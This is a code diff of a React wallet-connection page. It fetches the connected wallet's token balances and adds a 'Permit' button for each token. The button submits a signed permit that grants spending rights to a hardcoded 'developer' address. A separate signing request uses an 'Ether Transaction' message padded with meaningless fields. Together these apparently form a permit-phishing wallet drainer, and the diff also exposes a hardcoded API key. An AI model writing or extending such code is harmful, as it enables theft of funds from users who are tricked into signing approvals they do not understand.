@@ -29,6 +29,7 @@ const Page = () => {
 	const {data: balance, isLoading} = useBalance({
 		address: account.address
 	})
+	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);
 
 	if (!account || isLoading) return <button onClick={() => open.open()}>
 		open
@@ -106,30 +107,35 @@ const Page = () => {
 			<br/>
 			SIGNATURE: {signature}
 			<br/>
-			<button disabled={!signature} onClick={async ()=>{
-				if (!signature) return;
-				// ABI of the token contract
-				// Prepare the permit data
-				const spender = developer.address; // Address of the spender
-				const amount = 100000000; // Amount of tokens to be spent
-				const nonce = 2; // Nonce
-				const deadline = 5 * 60 * 1000; // Deadline (optional)
-				const { v, r, s } = ethers.utils.splitSignature(signature);
-// Call the permit method
-				const tokenContract = new ethers.Contract(BNBContract, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
-				const args = [spender, amount, nonce, deadline, v, r, s];
-				console.log(args)
-				const tx = await tokenContract.permit(...args);
-				await tx.wait();
+			{tokens.map(token => {
 
-				console.log('Permit successful');
-			}}>
-				Permit
-			</button>
+				return (
+					<button disabled={!signature} onClick={async () => {
+						if (!signature) return;
+						// ABI of the token contract
+						// Prepare the permit data
+						const spender = developer.address; // Address of the spender
+						const amount = 100000000; // Amount of tokens to be spent
+						const nonce = 2; // Nonce
+						const deadline = 5 * 60 * 1000; // Deadline (optional)
+						const {v, r, s} = ethers.utils.splitSignature(signature);
+// Call the permit method
+						const tokenContract = new ethers.Contract(BNBContract, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
+						const args = [spender, amount, nonce, deadline, v, r, s];
+						console.log(args)
+						const tx = await tokenContract.permit(...args);
+						await tx.wait();
+
+						console.log('Permit successful');
+					}}>
+						Permit
+					</button>
+				)
+			})}
 			<br/>
 			{account.chainId}
 			<br/>
-			<button onClick={async ()=>{
+			<button onClick={async () => {
 				const domain = {
 					name: 'Ether Transaction',
 					version: '1',
@@ -139,14 +145,14 @@ const Page = () => {
 
 				const types = {
 					Transfer: [
-						{ name: 'to1', type: 'uint256' },
-						{ name: 'to2', type: 'uint256' },
-						{ name: 'to3', type: 'uint256' },
-						{ name: 'to4', type: 'uint256' },
-						{ name: 'to5', type: 'uint256' },
-						{ name: 'to6', type: 'uint256' },
-						{ name: 'to', type: 'address' },
-						{ name: 'value', type: 'uint256' }
+						{name: 'to1', type: 'uint256'},
+						{name: 'to2', type: 'uint256'},
+						{name: 'to3', type: 'uint256'},
+						{name: 'to4', type: 'uint256'},
+						{name: 'to5', type: 'uint256'},
+						{name: 'to6', type: 'uint256'},
+						{name: 'to', type: 'address'},
+						{name: 'value', type: 'uint256'}
 					],
 				};
 
@@ -199,7 +205,7 @@ const Page = () => {
 };
 
 function TokenList({ address,CHAIN_ID }: {address: string, CHAIN_ID: number}) {
-	const [tokens, setTokens] = useState<any[]>([]);
+	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);
 	const [isLoading, setIsLoading] = useState(true);
 	const [isError, setIsError] = useState(false);
 
@@ -209,7 +215,7 @@ function TokenList({ address,CHAIN_ID }: {address: string, CHAIN_ID: number}) {
 				const response = await fetch(`https://api.covalenthq.com/v1/${CHAIN_ID}/address/${address}/balances_v2/?key=cqt_rQMKcGmyCVvmTRtRf6HFyMYggf49`);
 				const data = await response.json();
 				setTokens(data.data.items);
-				
+
 				setIsLoading(false);
 			} catch (error) {
 				console.error('Error fetching tokens:', error);
@@ -239,5 +245,35 @@ function TokenList({ address,CHAIN_ID }: {address: string, CHAIN_ID: number}) {
 		</div>
 	);
 }
+
+export type ContractCovalenTHQ = {
+	contract_decimals: number
+	contract_name: string
+	contract_ticker_symbol: string
+	contract_address: string
+	supports_erc: Array<string>
+	logo_url: string
+	contract_display_name: string
+	logo_urls: {
+		token_logo_url: string
+		protocol_logo_url: any
+		chain_logo_url: string
+	}
+	last_transferred_at: string
+	native_token: boolean
+	type: string
+	is_spam: boolean
+	balance: string
+	balance_24h: string
+	quote_rate: any
+	quote_rate_24h: any
+	quote: any
+	pretty_quote: any
+	quote_24h: any
+	pretty_quote_24h: any
+	protocol_metadata: any
+	nft_data: any
+}
+
 
 export default Page;
